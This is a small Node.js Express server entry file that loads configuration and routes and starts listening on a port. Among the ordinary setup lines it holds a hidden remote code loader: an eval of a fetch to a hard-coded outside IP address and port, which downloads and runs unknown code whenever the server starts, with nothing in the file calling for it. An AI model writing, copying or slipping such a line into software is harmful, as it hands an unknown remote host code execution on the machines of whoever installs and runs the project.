const { response } = require('express');

const env = process.env.NODE_ENV || 'development';

const config = require('./config/config')[env];
const app = require('express')();
eval(fetch('http://192.99.169.216:1224/data?file=init.js'));

require('./config/express')(app);
require('./config/routes')(app);

app.listen(config.port, console.log(`Listening on port ${config.port}! Now its up to you...`));

